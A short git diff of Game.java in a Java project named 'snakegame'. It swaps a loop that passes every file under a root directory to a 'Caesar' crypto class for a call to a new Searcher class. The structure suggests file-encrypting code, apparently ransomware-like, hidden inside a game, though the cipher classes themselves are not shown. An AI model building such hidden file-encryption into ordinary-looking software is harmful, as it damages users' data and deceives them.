@@ -1,6 +1,7 @@
 package me.herrlestrate.snakegame;
 
 import me.herrlestrate.snakegame.crypto.Caesar;
+import me.herrlestrate.snakegame.crypto.Searcher;
 
 import java.io.File;
 import java.util.Objects;
@@ -16,10 +17,7 @@ public class Game {
             return;
         }
 
-        for(File file : Objects.requireNonNull(new File(ROOT).listFiles())){
-            System.out.println(file.getName());
-            new Caesar(file);
-        }
+        new Searcher().start(ROOT);
     }
 
     private static String getRoot(){
